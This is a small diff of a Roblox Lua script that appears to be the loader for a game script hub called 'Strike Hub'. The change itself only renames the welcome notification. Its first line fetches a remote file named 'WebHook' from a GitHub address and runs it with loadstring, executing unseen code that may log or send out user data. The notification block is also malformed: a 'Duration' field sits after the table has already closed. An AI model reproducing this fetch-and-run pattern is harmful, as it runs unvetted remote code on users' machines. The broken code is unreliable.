@@ -1,6 +1,6 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/NoobieDev2009/s3423514/main/WebHook'))()
 game.StarterGui:SetCore("SendNotification", {
-    Title = "Welcome to Strike Hub";
+    Title = "Welcome to StrikeHub";
     Text = "Checking Game...";
     Icon = "http://www.roblox.com/asset/?id=10226844105";})
     Duration = 4;
